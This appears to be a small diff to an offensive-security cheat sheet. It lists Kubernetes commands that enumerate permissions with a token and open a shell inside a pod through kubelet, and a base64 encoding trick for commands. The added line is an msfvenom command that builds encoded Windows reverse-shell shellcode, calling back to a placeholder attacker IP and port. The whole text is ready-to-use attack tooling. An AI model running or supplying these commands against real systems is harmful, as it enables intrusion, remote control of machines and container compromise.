@@ -31,3 +31,4 @@ kubectl auth can-i --list --server=https://IP:PORT --token TOKEN --certificate-a
 kubectl describe pod PODD --list --server=https://IP:PORT --token TOKEN --certificate-authority=ca.crt
 kubeletctl -s IP exec "/bin/sh" --namespace NAMESPACE --pod POD --container CONTAINER
 echo -n COMMAND | iconv --to-code UTF-16LE | base64 -w 0
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
